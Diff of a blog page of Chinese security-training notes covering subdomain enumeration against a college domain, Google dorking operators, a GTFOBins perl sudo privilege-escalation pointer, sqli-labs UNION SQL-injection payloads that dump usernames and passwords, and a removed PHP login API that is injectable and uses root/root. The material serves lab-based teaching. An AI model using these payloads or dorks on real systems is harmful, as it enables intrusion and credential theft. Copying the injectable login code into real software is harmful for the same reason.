+<p>第二个命令需要去GTFOBins 网站（GTFOBins 是一个开源项目，旨在为渗透测试人员和安全研究人员提供一个易于使用的工具）寻找<br>（1）在该网站的搜索框搜索perl（perl是脚本语言）点击第2个箭头的perl，找到sudo<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704436575644-e9fca066-b3ed-403c-adbf-7f11c0131c9d.png" alt="image.png"><br>（2）复制sudo下面的命令，粘贴到kali<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704439185033-a4cf177c-1e3a-4b37-b0aa-c82d8128e01c.png" alt="image.png">      </p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-培训笔记26" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/01/08/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B026/" class="article-date">
+      <time datetime="2024-01-08T01:05:42.000Z" itemprop="datePublished">2024-01-08</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/08/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B026/">域名，子域名获取，百度和谷歌搜索语法</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p>又称网域，是由一串用点分隔的名字组成的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BA%92%E8%81%94%E7%BD%91/199186?fromModule=lemma_inlink">互联网</a>上某一台<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA/140338?fromModule=lemma_inlink">计算机</a>或计算机组的名称，用于在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93/2987565?fromModule=lemma_inlink">数据传输</a>时对计算机的定位标识。</p>
+<h3 id="法律"><a href="#法律" class="headerlink" title="法律"></a>法律</h3><p>1.国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。<br>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉 和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宜扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p>
+<p>2.[非法侵入计算机信息系统罪]违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。</p>
+<p>[非法获取计算机信息系统数据、非法控制计算机信息系统罪]违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金;情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。</p>
+<p>[提供侵入、非法控制计算机信息系统程序、工具罪]提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚。</p>
+<p>单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照各该款的规定处罚。</p>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul>
+<li>一级域名</li>
+</ul>
+<p> 一级域名是域名体系中最右边的部分，它通常代表了一个域名的类别或国家。比如在      baidu.com 中，.com 就是顶级域名</p>
+<ul>
+<li>二级域名（根域）</li>
+</ul>
+<p>二级域名位于顶级域名之前，它通常代表了一个组织或机构。在 baidu.com 中，baidu 就是二级域名，表示具体的商业实体。</p>
+<ul>
+<li>三级域名</li>
+</ul>
+<p> 三级域名位于二级域名之前，用于进一步细分组织内的不同部门或服务。例如，在 baidu.com 中，可以有 news.baidu.com，这里的 news 就是三级域名，表示百度公司下的新闻部门。<br>子域名<br>子域名是三级域名的一个特例，它通常用于指定主机的角色或服务类型，比如 www、mail、ftp 等。在 baidu.com 中，<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> 中的 www 就是子域名<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704204457366-9ad2648a-0b7a-4a94-a2d8-53f01a428c96.png" alt="Image.png"></p>
+<h2 id="子域名获取"><a href="#子域名获取" class="headerlink" title="子域名获取"></a>子域名获取</h2><h3 id="域名挖掘网站"><a href="#域名挖掘网站" class="headerlink" title="域名挖掘网站"></a>域名挖掘网站</h3><p>1.子域名爆破网站链接：<a target="_blank" rel="noopener" href="http://z.zcjun.com/">http://z.zcjun.com/</a><br>2.使用：以湖南信息学院  hnuit.edu.cn   为例，将这个网址填入下图框内，点击提交。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704205194309-c2eb7227-1d41-49ae-b553-58f976389b7e.png" alt="image.png"><br>复制爆出来的任一子域名，并在浏览器访问。结果如下，如果访问的每一个子域名都跳到同一页面，说明遇到泛解析了。注意：泛解析的作用是防爆破。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704205379859-a14fe73f-cd27-4174-97a2-b151ffd3c78d.png" alt="image.png">3. FOFA 搜索引擎      链接 <a target="_blank" rel="noopener" href="https://fofa.info/toLogin">https://fofa.info/toLogin</a><br>首先注册登录，查询湖南信息学院hnuit.edu.cn    结果如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704207297849-f99cc025-45c4-48db-8956-cf1a37215444.png" alt="image.png"><br>4.360网路空间测绘  <a target="_blank" rel="noopener" href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a><br>注册登录，查询湖南信息学院hnuit.edu.cn    结果如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704207604155-3ca089a1-4e13-4024-b3a6-ad5952f51034.png" alt="image.png"></p>
+<ol start="5">
+<li>奇安信        <a target="_blank" rel="noopener" href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a><br>注册登录，查询湖南信息学院hnuit.edu.cn    结果如下<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704207986119-0ec49a18-38c7-4b5c-b5ab-009cf77653f2.png" alt="image.png"></li>
+</ol>
+<h3 id="域名挖掘工具"><a href="#域名挖掘工具" class="headerlink" title="域名挖掘工具"></a>域名挖掘工具</h3><p>Layer子域名挖掘机4.2纪念版  提取链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1VQ2HLocs39B72ElysskPog">https://pan.baidu.com/s/1VQ2HLocs39B72ElysskPog</a>     提取码：121I<br>下图的1框中填入baidu.com,线程最好改成50或100，如果线程全速，路由器可能会瘫痪。最后点击启动，稍等一会，出现百度的子域名。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704279912613-8e1627a0-d695-4158-a55a-55c6ab3cd154.png" alt="image.png"></p>
+<h2 id="百度和谷歌搜索语法"><a href="#百度和谷歌搜索语法" class="headerlink" title="百度和谷歌搜索语法"></a>百度和谷歌搜索语法</h2><h3 id="百度语法"><a href="#百度语法" class="headerlink" title="百度语法"></a>百度语法</h3><p>1.在浏览器安装屏蔽广告插件<br>2.seo的含义：汉译为搜索引擎优化。是一种方式：利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。目的是让其在行业内占据领先地位，获得品牌收益。<br>3.语法<br>（1）增加相关资料，下图是增加知乎的内容<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704284517963-76bd31b5-9263-4323-8b0d-9d6c18291dbf.png" alt="image.png"><br>（2）减少相关内容，下图是减少CSDN的内容<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704284711776-b307af45-a554-49e3-bdf0-b238dc6556bd.png" alt="image.png"></p>
+<h3 id="谷歌语法"><a href="#谷歌语法" class="headerlink" title="谷歌语法"></a>谷歌语法</h3><p>1.“”英文双引号中的内容作为一个整体被搜索; 精确匹配搜索<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704285327533-f001791c-e778-49a1-a8b1-74a6465b1b57.png" alt="image.png"></p>
+<ol start="2">
+<li>mac*    搜索出mac有关的所有字符<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704285546055-4e9d4803-23c8-4333-a7ae-d5ca9d80f262.png" alt="image.png"></li>
+<li>“tencent.com” 马化腾 filetype:pdf<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704287069233-5dddc8e7-0179-4ec8-aa37-4b049a36edd5.png" alt="image.png"><ol start="4">
+<li><pre><code>  inurl:	把搜索范围限定在url链接中       &quot;hnuit.edu.cn&quot; inurl:id
+   ![image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704287110703-ca77c953-765d-4f1f-8ad4-cb0b5558d862.png)
+  5.Index  of	可以帮助你寻找网络和FTP目录          index  of mp3
+  ![image.png](https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704287288409-a273dfde-07e4-4279-b989-093690af8309.png)
+  6.详细谷歌语法
+</code></pre>
+</li>
+</ol>
+</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th><strong>算  符</strong></th>
+<th><strong>含    义</strong></th>
+<th><strong>应用举例</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AND&#x2F;空格</td>
+<td>所连接的关键词之间是“与”的关系;</td>
+<td>云计算 分布式计算</td>
+</tr>
+<tr>
+<td>OR&#x2F;&#124;</td>
+<td>所连接的关键词之间是“或”的关系</td>
+<td>图片 &#124; 写真</td>
+</tr>
+<tr>
+<td>-</td>
+<td>所连接的关键词之间是“非”的关系</td>
+<td>神雕侠侣 -游戏</td>
+</tr>
+<tr>
+<td>（）</td>
+<td>在检索式中括号里的运算将优先进行</td>
+<td>电子商务 AND  (云计算 -分布式计算)</td>
+</tr>
+<tr>
+<td>“”</td>
+<td>“”英文双引号中的内容作为一个整体被搜索; 精确匹配搜索</td>
+<td>“智能天线”</td>
+</tr>
+<tr>
+<td>*</td>
+<td>通配符-星号*，代表完整的字词; A * B、A * * B这两个是有区别的</td>
+<td>Flower  * pots &#x2F;Flower * * pots</td>
+</tr>
+<tr>
+<td>+</td>
+<td>强制搜索一般会被自动忽略的搜索关键词，如：who、the、of、am</td>
+<td>+B</td>
+</tr>
+<tr>
+<td>~</td>
+<td>同义符;在搜索词前使用，表示会和同时搜索相近词义的词;示例中会同搜元素Si</td>
+<td>~  silicon</td>
+</tr>
+<tr>
+<td>..</td>
+<td>搜索数字范围限定</td>
+<td>手机价格2000..5000</td>
+</tr>
+<tr>
+<td>filetype:</td>
+<td>把搜索范围限定在特定文件类型中; .pdf&#x2F;.doc&#x2F;.docx&#x2F;.ppt&#x2F;.pptx&#x2F;.xls&#x2F;.xlsx&#x2F;.rtf&#x2F;.txt&#x2F;.swf&#x2F;.ps</td>
+<td>霍金 黑洞filetype:pdf</td>
+</tr>
+<tr>
+<td>site：</td>
+<td>把搜索范围限定在特定站点、某一站点特定频道、特定域名后缀中</td>
+<td>科技 site:news.163.com</td>
+</tr>
+<tr>
+<td>inurl:</td>
+<td>把搜索范围限定在url链接中</td>
+<td>inurl:jiqiao  photoshop</td>
+</tr>
+<tr>
+<td>allinurl:</td>
+<td>把搜索范围限定在url链接中, 只不过其后所有关键词均要在url链接中出现</td>
+<td>allinurl:jiqiao  photoshop</td>
+</tr>
+<tr>
+<td>intitle</td>
+<td>把搜索范围限定在网页标题中</td>
+<td>商业 intitle:超级女声</td>
+</tr>
+<tr>
+<td>allintitle:</td>
+<td>把搜索范围限定在网页标题中; 只不过其后所有关键词均要在网页标题中出现</td>
+<td>allintitle:超级女声 张靓颖</td>
+</tr>
+<tr>
+<td>intext:</td>
+<td>把搜索范围限定在网页正文中; 忽略超链接文本、URL以及题目等</td>
+<td></td>
+</tr>
+</tbody></table>
+<p> |<br>| inanchor: | 把搜索范围限定在链接锚文本文字中 | inanchor:吴清源 |<br>| anchor: | 检索某一作者&#x2F;发明人的论著; 只在Google Scholar中可用 | anchor:&#x2F;作者: |<br>| link： | 检索所有链接到某个特定URL网址的网页;只能单独使用 | link:163.com |<br>| cache: | Google网页快照 | </p>
+<p> |<br>| related： | 检索与某特定网页类似的网页 | related:<a target="_blank" rel="noopener" href="http://www.163.com/index.shtml">www.163.com/index.shtml</a> |<br>| info: | 用来显示与某链接相关的一系列搜索; 提供cache、similar-pages、link、related等连接 | info:<a target="_blank" rel="noopener" href="http://www.sina.com.cn/">www.sina.com.cn</a> |<br>| Index  of | 可以帮助你寻找网络和FTP目录 | index  of mp3 |<br>| daterange: | 查找在一定的日期或者一定的日期范围内; 只关注被Google收录的时间 | </p>
+<p> |<br>| location: | 指定地区区域内查询关键词相关的网页 | wow  gold location:France |<br>| weather: | 查询该地区或城市当前的天气状况 | weather:北京 |<br>| stocks: | 查询股票信息; 一般源于专业财经网站 | stocks:比亚迪 |<br>| define: | 返回包含查询关键词定义的网面 | define:  暗网 |<br>| 注意:关键词与命令之间有一个空格;在这些关键字中;请勿在冒号后面接空格;命令需用英文输入,包括冒号。AND、OR、NOT均应大写,而其他算符必须是小写，虽其对检索词完全不区分大小写 |  |  |</p>
+<p>Google高级搜索<br><a target="_blank" rel="noopener" href="http://www.google.com.hk/advanced_search">http://www.google.com.hk/advanced_search</a><br>Google网页搜索帮助中心<br><a target="_blank" rel="noopener" href="https://support.google.com/websearch/?hl=zh-Hans">https://support.google.com/websearch/?hl=zh-Hans</a><br>谷歌分类目录<br><a target="_blank" rel="noopener" href="http://directory.google.com/">http://directory.google.com/</a><br>Google对于检索词中的大小写是完全不做区分的;在Google中，检索词的排序方式对于整个检索式具有重要的影响，它将首先匹配按照检索式给出的次序进行搜索。同时它也将优先匹配检索词相互邻接的网页。GOOGLE支持多达132种语言，包括简体中文和繁体中文，可以设置页面语言和搜索语言，可对汉字繁简体进行转换，可以跨语言搜索。Google搜索结果中可对搜索范围进行限制，如：网页的发布更新时间或一个时间段内，搜索结果的类型选择如图片、视频、书籍、应用程序、新闻。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-培训笔记25" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -715,275 +1152,6 @@
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703084084617-c5a5e408-80ed-4633-8657-172464224c47.png" alt="image.png"><br>6.查字段名，把原来语句的基础上，把查表语句改成查字段语句，然后加上– -<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#39;users&#39; and table_schema=database();-- -</code></p>
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703084568983-25426fef-0ad4-4668-92fe-01c31deb7031.png" alt="image.png"><br>7.最后查字段，把原来语句的基础上，把查字段名语句改成查字段语句，在 group_concat(id,”<del>“,username,”</del>“,password)的group前加上     1，      在password）后面加    ,3       最后再完整语句后加上– -<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1, group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3 from users ;-- -</code></p>
 <p>8.最终得到我们想要的整列的username和整列的password<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703085525578-5bf71d67-d324-4a38-bec1-a63cdfd5bcc0.png" alt="Image.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-培训笔记19" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B019/" class="article-date">
-      <time datetime="2023-12-23T14:29:31.000Z" itemprop="datePublished">2023-12-23</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B019/">axios和api.php的使用</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="axios的使用"><a href="#axios的使用" class="headerlink" title="axios的使用"></a>axios的使用</h2><p>1.在vscode创建index.php，导入index.js，vue.js，index.js，axios.min.js四个包<br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/zip/40675946/1702896649350-83e99bd5-f450-45df-b6bd-191782c72372.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40675946/1702896649350-83e99bd5-f450-45df-b6bd-191782c72372.zip%22,%22name%22:%22html%E4%BD%BF%E7%94%A8vue%E6%9D%90%E6%96%99%E5%8C%85.zip%22,%22size%22:396254,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u83b244ba-1d15-4404-ac0b-95d567d07c7%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22ue688691f%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">html使用vue材料包.zip</a><br>2.（1）编写index.php，写入以下代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt;</span><br><span class="line">    &lt;script src=&quot;./vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;login1&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;login2&quot;&gt;</span><br><span class="line">                &lt;i class=&quot;el-icon-reading&quot;&gt;&lt;/i&gt;</span><br><span class="line">                &lt;h1&gt;图书管理系统登录&lt;/h1&gt;</span><br><span class="line">                &lt;el-input placeholder=&quot;请输入内容&quot; v-model=&quot;userData.username&quot; clearable&gt;&lt;/el-input&gt;</span><br><span class="line">                &lt;el-input placeholder=&quot;请输入内容&quot; v-model=&quot;userData.password&quot; clearable show-password&gt;&lt;/el-input&gt;</span><br><span class="line">                &lt;el-button type=&quot;primary&quot; @click=&quot;login&quot;&gt;登录&lt;/el-button&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .el-icon-reading &#123;</span><br><span class="line">            font-size: 100px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .login2 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            height: 20vh;</span><br><span class="line">            width: 20vw;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .login1 &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            flex-direction: column;</span><br><span class="line">            align-items: center;</span><br><span class="line">            background-image: url(./img/6.jpg);</span><br><span class="line">            background-repeat: no-repeat;</span><br><span class="line">            background-size: 100% 100%;</span><br><span class="line">            background-attachment: fixed;</span><br><span class="line">            width: 100vw;</span><br><span class="line">            height: 100vh;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;script src=&quot;./axios.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        new Vue(&#123;</span><br><span class="line">            el: &#x27;#app&#x27;,</span><br><span class="line">            data: function() &#123;</span><br><span class="line">                return &#123;</span><br><span class="line">                    visible: false,</span><br><span class="line">                    userData: &#123;</span><br><span class="line">                        username: &#x27;&#x27;,</span><br><span class="line">                        password: &#x27;&#x27;,</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                login: function() &#123;</span><br><span class="line">                    axios.post(&#x27;http://192.168.17.128/api.php&#x27;, this.userData)</span><br><span class="line">                        .then((response) =&gt; &#123;</span><br><span class="line">                                console.log(response);</span><br><span class="line">                                if (response.data.includes(&#x27;success&#x27;)) &#123;</span><br><span class="line">                                    window.location.href = &quot;http://192.168.17.128/zhuye.php&quot;;</span><br><span class="line">                                &#125; else &#123;</span><br><span class="line">                                    this.open4();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        )</span><br><span class="line">                &#125;,</span><br><span class="line">                open4: function() &#123;</span><br><span class="line">                    this.$notify.error(&#123;</span><br><span class="line">                        title: &#x27;错误&#x27;,</span><br><span class="line">                        message: &#x27;账号密码错误&#x27;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>（2）45到78行使用了axios和数据绑定，我们来进行分析。代码创建了一个Vue实例并绑定到id为”app”的元素上。在data选项中定义了一些数据属性，包括visible、userData和其中的username和password属性。<br>在methods选项中定义了一个名为login的方法。该方法使用Axios发送一个POST请求到”<a target="_blank" rel="noopener" href="http://192.168.17.128/api.php%22%EF%BC%8C%E5%B9%B6%E4%BC%A0%E9%80%92userData%E4%BD%9C%E4%B8%BA%E8%AF%B7%E6%B1%82%E7%9A%84%E5%8F%82%E6%95%B0%E3%80%82%E8%AF%B7%E6%B1%82%E6%88%90%E5%8A%9F%E5%90%8E%EF%BC%8C%E9%80%9A%E8%BF%87%E5%88%A4%E6%96%AD%E8%BF%94%E5%9B%9E%E7%9A%84%E5%93%8D%E5%BA%94%E6%95%B0%E6%8D%AE%E4%B8%AD%E6%98%AF%E5%90%A6%E5%8C%85%E5%90%AB%22success%22%E6%9D%A5%E7%A1%AE%E5%AE%9A%E7%99%BB%E5%BD%95%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F%E3%80%82%E5%A6%82%E6%9E%9C%E6%88%90%E5%8A%9F%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%B0%86%E8%B7%B3%E8%BD%AC%E5%88%B0%22http://192.168.2.70/zhuye.php%22%EF%BC%9B%E5%A6%82%E6%9E%9C%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%B0%86%E8%B0%83%E7%94%A8open4%E6%96%B9%E6%B3%95%E3%80%82">http://192.168.17.128/api.php&quot;，并传递userData作为请求的参数。请求成功后，通过判断返回的响应数据中是否包含&quot;success&quot;来确定登录是否成功。如果成功，代码将跳转到&quot;http://192.168.2.70/zhuye.php&quot;；如果失败，将调用open4方法。</a><br>open4方法使用了Vue的$notify方法来显示一个错误通知，通知的标题是”错误”，内容是”账号密码错误”。</p>
-<h2 id="api-php的使用"><a href="#api-php的使用" class="headerlink" title="api.php的使用"></a>api.php的使用</h2><p>1.编写api.php,写入以下代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: *&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With&quot;);</span><br><span class="line">$link = mysqli_connect(&quot;192.168.17.128&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(json_encode([&#x27;error&#x27; =&gt; &#x27;数据库连接失败！&#x27;]));</span><br><span class="line">mysqli_query($link, &quot;set names utf8&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$requertPath = $_SERVER[&#x27;REQUEST_URI&#x27;];</span><br><span class="line">$requestMethod = $_SERVER[&#x27;REQUEST_METHOD&#x27;];</span><br><span class="line">if ($requertPath === &#x27;/api.php&#x27; &amp;&amp; $requestMethod === &#x27;POST&#x27;) &#123;</span><br><span class="line">    $inputJSON = file_get_contents(&quot;php://input&quot;);</span><br><span class="line">    $input = json_decode($inputJSON, true);</span><br><span class="line">    if ($input === null) &#123;</span><br><span class="line">        header(&#x27;HTTP/1.1 400 Bad Request&#x27;);</span><br><span class="line">        echo json_encode([&#x27;error&#x27; =&gt; &#x27;Invalid JSON&#x27;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        $username = $input[&#x27;username&#x27;];</span><br><span class="line">        $password = $input[&#x27;password&#x27;];</span><br><span class="line">        $sql = &quot;SELECT username, password FROM users WHERE username=&#x27;$username&#x27; and  password=&#x27;$password&#x27;LIMIT 0,1&quot;;</span><br><span class="line">        $result = mysqli_query($link, $sql);</span><br><span class="line">        if (mysqli_num_rows($result) &gt; 0) &#123;</span><br><span class="line">            echo &#x27;success&#x27;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;账号和密码错误&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    header(&#x27;http/1.1 400 Bad Request&#x27;);</span><br><span class="line">    echo json_encode([&#x27;error&#x27; =&gt; &#x27;Invalid JSON&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
